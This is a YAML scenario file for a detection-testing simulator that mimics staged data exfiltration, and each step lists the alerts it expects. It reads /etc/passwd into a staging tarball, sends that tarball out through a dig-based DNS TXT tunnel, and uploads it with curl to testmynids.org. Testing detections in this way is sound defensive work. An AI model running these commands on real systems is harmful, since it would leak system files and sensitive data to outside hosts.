@@ -1,0 +1,149 @@
+scenario_id: SIM-MP-003
+name: "Staged Data Exfiltration via DNS Tunneling — XDR + NGFW Stitch"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-MP-03
+tc_ref: TC-MP-03
+uc_name: "Cross-Plane Incident Stitching"
+tc_name: "Exfiltration Chain - Endpoint Staging Through Network Covert Channel"
+
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1048.003"
+mitre_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
+additional_techniques:
+  - technique: "T1074.001"
+    name: "Data Staged: Local Data Staging"
+  - technique: "T1572"
+    name: "Protocol Tunneling"
+  - technique: "T1005"
+    name: "Data from Local System"
+
+threat_report: "Unit42 - DNS Tunneling as C2 and Exfil Channel"
+threat_report_url: "https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused/"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - root
+
+push_supported: true
+pull_supported: true
+
+required_content:
+  - repo: "3CORESec/testmynids.org"
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+external_tools: []
+
+steps:
+  - id: step-01
+    name: "Collect sensitive-looking data from endpoint"
+    command: |
+      echo '[MP-003] XDR: local data collection simulating credential harvest';
+      mkdir -p /tmp/cortexsim_stage;
+      echo "# Simulated credential file - NOT real credentials" > /tmp/cortexsim_stage/creds.txt;
+      for i in 1 2 3 4 5; do
+        echo "user$i:simulated-hash-$(openssl rand -hex 16)" >> /tmp/cortexsim_stage/creds.txt;
+      done;
+      cat /etc/passwd | head -20 >> /tmp/cortexsim_stage/creds.txt;
+      echo '[*] XDR should detect /etc/passwd read + file concatenation pattern'
+    identity: www-data
+    mitre_technique: "T1005"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "XDR - /etc/passwd read followed by write to /tmp staging directory"
+      - plane: EDR
+        type: Analytics
+        description: "XDR - sensitive-file-path access from non-admin service account"
+
+  - id: step-02
+    name: "Stage data in compressed format"
+    command: |
+      echo '[MP-003] XDR: staging compressed tarball';
+      tar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null;
+      ls -la /tmp/cortexsim_stage/;
+      echo '[*] XDR detects tar+gzip of staging directory (classic exfil prep)'
+    identity: www-data
+    mitre_technique: "T1074.001"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "XDR - data staging: tar compression of recently-written files in /tmp by service account"
+
+  - id: step-03
+    name: "Exfiltrate staged data over DNS tunnel"
+    command: |
+      echo '[MP-003] NDR: DNS tunneling exfiltration - high volume + high entropy';
+      B64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000);
+      chunks=$((${#B64} / 60));
+      for i in $(seq 0 $chunks); do
+        chunk=$(echo -n "$B64" | cut -c$((i*60+1))-$(((i+1)*60)));
+        [ -z "$chunk" ] && break;
+        dig +short TXT "$(echo -n "$chunk" | tr -d = | tr '/+' '-_').exfil.testmynids.org" @1.1.1.1 > /dev/null || true;
+        sleep 0.5;
+      done;
+      echo "[*] Exfiltrated $chunks DNS TXT chunks"
+    identity: www-data
+    mitre_technique: "T1048.003"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "NGFW - DNS anomaly: sustained TXT query burst with high-entropy 60-char labels = tunneling signature"
+      - plane: NDR
+        type: Analytics
+        description: "NGFW - DNS query rate spike: >10x baseline from single source"
+      - plane: EDR
+        type: BIOC
+        description: "XDR - dig invocation in tight loop from service account (shell one-liner DNS exfil)"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM stitching - /tmp stage write (XDR) + DNS tunnel burst (NGFW) + same hostname = end-to-end exfiltration incident, MTTD measured from stage-to-tunnel"
+
+  - id: step-04
+    name: "Alternative exfil: HTTPS POST to known-bad endpoint"
+    command: |
+      echo '[MP-003] NDR: second exfil channel for redundant detection';
+      curl -sSL -m 15 -X POST -F "data=@/tmp/cortexsim_stage/bundle.tar.gz" \
+        "http://testmynids.org/uid/index.html" 2>/dev/null | head -5 || true;
+      echo '[*] NGFW flags POST to known-IOC domain; XDR flags file upload from service account'
+    identity: www-data
+    mitre_technique: "T1048"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "NGFW - HTTP POST with file upload to IOC-listed domain"
+      - plane: EDR
+        type: BIOC
+        description: "XDR - curl -F file upload of recently-staged data by service account"
+      - plane: ANALYTICS
+        type: IOC
+        description: "XSIAM - IOC match on destination domain correlates with staged data hash"
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/cortexsim_stage"
+    - "echo '[CortexSim] SIM-MP-003 cleanup complete'"
+
+author: "Henry Reed"
+created: "2026-04-20"
+last_updated: "2026-04-20"
+tags:
+  - multi-plane
+  - stitching
+  - exfiltration
+  - dns-tunneling
+  - data-staging
+  - xdr-ngfw-correlation
